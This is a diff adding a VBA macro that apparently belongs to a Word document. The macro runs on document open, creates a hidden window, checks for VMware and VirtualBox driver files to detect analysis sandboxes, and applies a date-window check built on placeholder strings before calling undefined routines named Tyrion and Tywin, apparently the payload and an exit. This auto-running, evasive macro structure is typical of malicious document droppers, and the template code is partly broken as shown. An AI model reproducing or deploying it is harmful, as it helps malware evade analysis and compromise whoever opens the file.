@@ -1,0 +1,44 @@
+Function UserProfile() As Boolean
+    Dim str_dateMin As String
+    Dim str_dateMax As String
+    Dim dateMin As Date
+    Dim dateMax As Date
+    Dim todayDate As Date
+    str_dateMin = "firstdate"
+    str_dateMax = "lastdate"
+    dateMin = CDate(str_dateMin)
+    dateMax = CDate(str_dateMax)
+    todayDate = Date
+    If dateMin >= todayDate Or todayDate <= dateMax Then
+    Else
+        Tywin
+    End If
+    Dim VmWareFileName As String
+    Dim VBoxFileName As String
+    Dim vm As Integer  
+    Dim VmWareFileExists As String
+    Dim VBoxFileExists As String  
+    VmWareFileName = "C:\Windows\System32\drivers\vmhgfs.sys"
+    VBoxFileName = "C:\Windows\System32\drivers\VBoxVideo.sys"
+    VmWareFileExists = Dir(VmWareFileName)
+    VBoxFileExists = Dir(VBoxFileName)
+    Select Case True
+        Case VmWareFileExists = "vmhgfs.sys": vm = 1
+        Case VBoxFileExists = "VBoxVideo.sys": vm = 1
+    End Select
+    If vm = 1 Then
+        UserProfile = False
+    Else
+        UserProfile = True
+    End If
+End Function
+Private Sub Document_Open
+    Set myWindow = ActiveDocument.ActiveWindow.NewWindow
+    myWindow.Visible = False
+    If UserProfile = True Then
+        Tyrion
+        Tywin
+    Else
+        Tywin
+    End If
+End Sub
